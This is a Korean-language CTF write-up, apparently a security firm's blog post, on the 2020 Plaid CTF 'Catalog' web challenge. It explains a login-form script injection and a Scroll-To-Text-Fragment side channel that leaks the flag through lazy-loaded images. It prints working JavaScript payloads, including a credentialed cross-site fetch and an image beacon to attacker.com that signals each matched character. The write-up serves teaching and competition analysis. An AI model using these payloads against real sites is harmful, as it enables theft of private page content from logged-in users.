---
layout: post
title:  "2020 Plaid CTF Catalog"
author: "iwkang@raoncorp.com"
comments: true
tags: [ctf, write-up]
---


> 2020.04
라온화이트햇 핵심연구팀 강인욱 (iwkang@raoncorp.com)

2020 Plaid CTF에 출제된 문제중 0 솔버였던 흥미로운 문제이다.

문제 출제자 : [https://twitter.com/thebluepichu](https://twitter.com/thebluepichu)

이 문제에 처음 접속 하면 아래와 같이 회원가입, 로그인, 로그아웃 글 작성을 하는 기능이 있으며, 로그인시 관련된 정보(BAM! ~~~~)가 상단에 출력된다.

![/assets/2020_Plaid_CTF_Catalog/Untitled.png](/assets/2020_Plaid_CTF_Catalog/Untitled.png)

CSP를 확인해보면 아래와 같다.

```jsx
Content-Security-Policy: default-src 'nonce-xxxxx'; img-src *; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/
```

nonce가 활성화되어 있으며 스크립트를 삽입하더라도 코드 실행을 할 수 없습니다. 한가지 주목할 점은 img 태그의 경로를 외부 링크로 설정할 수 있다는 점이다.

문제의 목적은 문제 출제자가 작성한 id=3의 게시글에서 플래그를 가져와야 한다. 플래그 포맷은 다음과 같다.

```jsx
Flag format : /^PCTF\{[A-Z0-9_]+\}$/ 
```

플래그 포맷을 주었다는 점에서 어떠한 작업을 이용해 브루트 포싱으로 플래그를 "검색"해서 읽어야 한다는 것을 알 수 있다.

공격 시나리오를 예상해보면 다음과 같다.

1. 글을 작성하여 봇이 글을 읽게한다.
2. id=3 게시글에 접근하여 어떠한 방법을 통해 이미지 지연 로딩(loading=lazy)을 활용하여 플래그를 유추한다.

대회 당시에는 "어떠한 방법"을 찾을 수 없었지만 Chrome 80 부터 Scroll To Text Fragment가 가능하다고 한다.

[https://www.chromestatus.com/feature/4733392803332096](https://www.chromestatus.com/feature/4733392803332096)

Scroll To Text Fragment은 아래와 같이 사용 가능하다. 이 기능을 이용하기 위해선 사용자 제스처(탭, 클릭)가 필요하다. 출제자는 uBlock Origin 플러그인이 활성화되어 있을 경우를 가정했다.

 

STTF 보안 이슈

```jsx
https://docs.google.com/document/d/1YHcl1-vE_ZnZ0kL2almeikAj2gkwCq8_5xwIae7PVik/edit#heading=h.uoiwg23pt0tx
```

사용법

```jsx
https://en.wikipedia.org/wiki/Cat#:~:text=On
```

이 기능을 사용하면 문서 내용중 "On"이라는 글자가 있는 곳으로 스크롤 된다. 

그렇다면, 이 기능을 사용하여 플래그를 읽으려면 id=3 게시물에 스크립트가 삽입이 되어야한다.

스크립트 삽입은 로그인시 상단에 표시되는 아이디로 가능합니다. 로그인을 실패해도 상단에 메세지가 뜨기 때문에 스크립트 삽입이 가능해진다.

![2020%20Plaid%20CTF%20Catalog%209fe8408c81db490a97f6b5f1dc863d5a/Untitled.png](2020%20Plaid%20CTF%20Catalog%209fe8408c81db490a97f6b5f1dc863d5a/Untitled.png)

아래와 같이 유저이름에 스크립트를 삽입한 후 id=3로 이동시키면 상단에 스크립트가 삽입된다.

```jsx
<script>
fetch("http://catalog.pwni.ng/user.php", {
	method: "POST",
	mode: "no-cors",
	credentials: "include",
	headers: {
		"content-type": "application/x-www-form-urlencoded"
	},
	body: "username="+encodeURIComponent("<myscript>test code</myscript>")+"&password=hello&action=login"
}).then(() => {
	window.location = "http://catalog.pwni.ng/issue.php?id=3";
});
</script>
```

이제 단서들을 모아서 공격 시나리오를 재구성 하면 아래와 같다.

1. 관리자가 ublock origin 플러그인을 사용중인 상태에서 게시글을 클릭한다.
2. meta tag를 이용해 attacker.com으로 이동 시킨다.
3. attacker.com에서 로그인 요청을 발생시켜 id=3 게시물 상단에 스크립트를 삽입한다.
4. 스크립트로 meta tag를 이용해 Scroll To Text Fragment를 발생시킨다.
5. 이미지 지연 로딩(<img src="http://attacker.com/img" loading="lazy">)을 이용해 플래그가 검색될 경우 attacker.com의 이미지를 로드하도록 한다.
6. 이미지가 로딩되면 검색이 되었다는 뜻이고 로딩이 안되면 검색이 안되었다는 뜻이다.

예시 코드

```jsx
<script>

alphabet = `}0123456789ABDEFGHIJKLMNOPQRSTUVWXYZ_`;
payload  = "";

content = "~~~~~~<h1></h1>".repeat(500)+"<img src="http://attacker.com/img" loading="lazy" />~~~~~";

for (let letter of alphabet) {
    payload += `text=T-,F,{,-${letter}%26`;
}
payload = "#:~:" + payload.substring(0, payload.length - 3);

fetch("http://catalog.pwni.ng/user.php", {
	method: "POST",
	mode: "no-cors",
	credentials: "include",
	headers: {
		"content-type": "application/x-www-form-urlencoded"
	},
	body: "username="+encodeURIComponent(content)+"&password=hello&action=login"
}).then(() => {
	window.location = "http://catalog.pwni.ng/issue.php?id=3#:~:"+payload;
});
</script>
```